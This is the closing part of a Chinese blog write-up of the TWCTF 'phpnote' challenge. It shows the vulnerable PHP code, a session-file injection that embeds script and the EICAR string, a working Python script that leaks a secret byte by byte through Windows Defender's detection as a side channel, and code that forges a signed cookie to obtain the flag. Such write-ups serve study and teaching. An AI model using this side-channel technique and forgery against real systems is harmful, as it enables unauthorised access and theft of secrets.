+    <span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token constant">SALT</span> <span class="token punctuation">.</span> <span class="token variable">$seed</span> <span class="token punctuation">.</span> <span class="token constant">PEPPER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token string">"rootroot"</span><span class="token punctuation">;</span>
+<span class="token variable">$realname</span> <span class="token operator">=</span> <span class="token string">"adminadminadmin"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$realname</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$realname</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'invalid name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'realname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$realname</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">gen_secret</span><span class="token punctuation">(</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p><code>session</code>文件内容如下，第一次我们先post<code>nickname</code>为空，因为nickname是在<code>secret</code>先设置，如果我们不设置<code>nickname</code>为空，<code>nickname</code>的值会出现<code>secret</code>，导致我们注入恶意数据读取不了<code>secret</code>，我们可以看一下两者的区别<br>第一次post<code>nickname</code>值不为空时</p>
+<pre><code>realname|s:15:"adminadminadmin";nickname|s:8:"rootroot";secret|s:32:"70034bb522e6f77c6f3e88d18b86c6df";
+</code></pre><p>第一次post<code>nickname</code>值为空时，第二次post个<code>rootroot</code></p>
+<pre><code>realname|s:15:"adminadminadmin";secret|s:32:"70034bb522e6f77c6f3e88d18b86c6df";nickname|s:8:"rootroot";
+</code></pre><p>然后<code>nickname</code>和<code>realname</code>的值我们可以控，所以我们可以在这两个值之间注入我们的恶意数据，例如<code>realname</code>为<code>&lt;script&gt;xxxxxx&lt;/script&gt;&lt;body&gt;</code>，然后<code>nickname</code>为：<code></code><br>闭合之后就是</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">xxxxxx</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>";secret|s:32:"70034bb522e6f77c6f3e88d18b86c6df";nickname|s:8:"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>";
+</code></pre>
+<p>然后刚好secret在body标签内</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>";secret|s:32:"70034bb522e6f77c6f3e88d18b86c6df";nickname|s:8:"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>这意味着我们可以利用<code>document.body.innerHTML</code>读到我们的<code>secret</code></p>
+<p>梳理一下攻击步骤，大致步骤如下：</p>
+<ol>
+<li>向session文件中注入恶意数据</li>
+<li>利用Windows-Defender的检测机制，然后观察是否返回正常，如果检测的到恶意数据的话会登陆失败，否则则登陆成功</li>
+<li>在<code>realname</code>和<code>nickname</code>之间嵌入JS脚本，然后逐字节泄露<code>secret</code></li>
+</ol>
+<p>改一下作者原来在WCTF上<code>Gyotaku</code>的脚本，跑一下</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://phpnote.chal.ctf.westerns.tokyo/?action="</span>
+
+<span class="token keyword">def</span> <span class="token function">randstr</span><span class="token punctuation">(</span>n<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">import</span> random
+    <span class="token keyword">import</span> string
+    chars <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_uppercase <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
+    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">trigger</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">import</span> string
+    prefix <span class="token operator">=</span> randstr<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    p <span class="token operator">=</span> prefix <span class="token operator">+</span> <span class="token triple-quoted-string string">'''&lt;script>f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script>&lt;body>'''</span>
+    payload <span class="token operator">=</span> string<span class="token punctuation">.</span>Template<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span>substitute<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'idx'</span><span class="token punctuation">:</span> idx<span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">:</span> c<span class="token punctuation">}</span><span class="token punctuation">)</span>
+    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    data_1 <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"nickname"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+        <span class="token string">"realname"</span><span class="token punctuation">:</span> <span class="token string">"aaaaaaaaaaaaaaaaaaaaaa"</span>
+    <span class="token punctuation">}</span>
+    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"login"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data_1<span class="token punctuation">)</span>
+    data_2 <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"nickname"</span><span class="token punctuation">:</span> <span class="token string">"&lt;/body>"</span><span class="token punctuation">,</span>
+        <span class="token string">"realname"</span><span class="token punctuation">:</span> payload
+    <span class="token punctuation">}</span>
+    resp<span class="token operator">=</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"login"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data_2<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">"Welcome"</span> <span class="token operator">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+
+<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    l<span class="token punctuation">,</span> h <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100</span>
+    <span class="token keyword">while</span> h <span class="token operator">-</span> l <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>
+        m <span class="token operator">=</span> <span class="token punctuation">(</span>h <span class="token operator">+</span> l<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
+        flags <span class="token operator">=</span> trigger<span class="token punctuation">(</span>m<span class="token punctuation">,</span> idx<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> flags<span class="token punctuation">:</span>
+            l <span class="token operator">=</span> m
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            h <span class="token operator">=</span> m
+    <span class="token keyword">return</span> chr<span class="token punctuation">(</span>l<span class="token punctuation">)</span>
+
+data <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">+=</span> leak<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+</code></pre>
+<p>跑一会，<code>secret</code>就跑出来了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909233328-2be928d8-d317-1.png" alt="image.png"></p>
+<p>然后再用<code>secret</code>签名一下数据就能getflag了</p>
+<pre><code>$secret = "2532bd172578d19923e5348420e02320";
+$note = new Note(true);
+$note-&gt;addnote("abc","abc");
+$data = base64_encode(serialize($note));
+echo $data.PHP_EOL;
+echo hash_hmac('sha256', $data, $secret).PHP_EOL;
+var_dump(verify($data,hash_hmac('sha256', $data, $secret)));
+</code></pre><p>改一下cookie访问<code>http://phpnote.chal.ctf.westerns.tokyo/?action=getflag</code>就能<code>getflag</code>了</p>
+<p><code>TWCTF{h0pefully_I_haven't_made_a_m1stake_again}</code></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf" target="_blank" rel="noopener">https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf</a><br><a href="https://meizjm3i.github.io/2019/08/01/%E5%88%A9%E7%94%A8Windows%20Defender%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">https://meizjm3i.github.io/2019/08/01/%E5%88%A9%E7%94%A8Windows%20Defender%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/</a></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-09-13T03:36:27.160Z" itemprop="dateUpdated">2019-09-13 11:36:27</time>
+</span><br>
+
+
+        
+        know it then hack it
+        
+    </div>
+    
+    <footer>
+        <a href="https://byqiyou.github.io">
+            <img src="/img/avatar.jpg" alt="七友">
+            七友
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/侧信道攻击/">侧信道攻击</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/09/08/从一道CTF题了解Windows-Defender侧信道攻击/&title=《从一道CTF题了解Windows-Defender侧信道攻击》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/09/08/从一道CTF题了解Windows-Defender侧信道攻击/&title=《从一道CTF题了解Windows-Defender侧信道攻击》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2019/09/08/从一道CTF题了解Windows-Defender侧信道攻击/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《从一道CTF题了解Windows-Defender侧信道攻击》 — 七友&url=https://byqiyou.github.io/2019/09/08/从一道CTF题了解Windows-Defender侧信道攻击/&via=https://byqiyou.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2019/09/08/从一道CTF题了解Windows-Defender侧信道攻击/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/10/02/windows中常见后门持久化方法总结/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">windows中常见后门持久化方法总结</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/09/08/N1CTF2019渗透题题解/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">N1CTF2019渗透题题解</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+<section class="comments" id="comments">
+    <div id="disqus_thread"></div>
+    <script>
+    var disqus_shortname = 'true';
+    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        Thinks
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/2.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/2.png" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>七友 &copy; 2015 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/09/08/从一道CTF题了解Windows-Defender侧信道攻击/&title=《从一道CTF题了解Windows-Defender侧信道攻击》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/09/08/从一道CTF题了解Windows-Defender侧信道攻击/&title=《从一道CTF题了解Windows-Defender侧信道攻击》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2019/09/08/从一道CTF题了解Windows-Defender侧信道攻击/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《从一道CTF题了解Windows-Defender侧信道攻击》 — 七友&url=https://byqiyou.github.io/2019/09/08/从一道CTF题了解Windows-Defender侧信道攻击/&via=https://byqiyou.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2019/09/08/从一道CTF题了解Windows-Defender侧信道攻击/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://byqiyou.github.io/2019/09/08/从一道CTF题了解Windows-Defender侧信道攻击/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
